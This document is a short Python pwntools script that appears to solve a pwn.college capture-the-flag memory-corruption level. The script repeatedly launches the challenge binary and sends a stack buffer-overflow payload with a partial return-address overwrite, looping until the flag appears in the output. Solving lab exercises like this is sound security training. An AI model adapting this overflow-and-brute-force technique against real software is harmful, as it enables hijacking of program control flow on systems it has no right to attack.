from pwn import *


while True:
    p = process("/challenge/babymem_level9.1")
    p.sendline(b"122")
    rbp_addr = 0x210E
    s=b"A"*(0x60) + b"\x77" +rbp_addr.to_bytes(2,"little")
    p.send(s)
    all = p.recvall()
    p.close()
    all = all.decode()
    print(all)
    if all.find("pwn.college{")!=-1:
        break

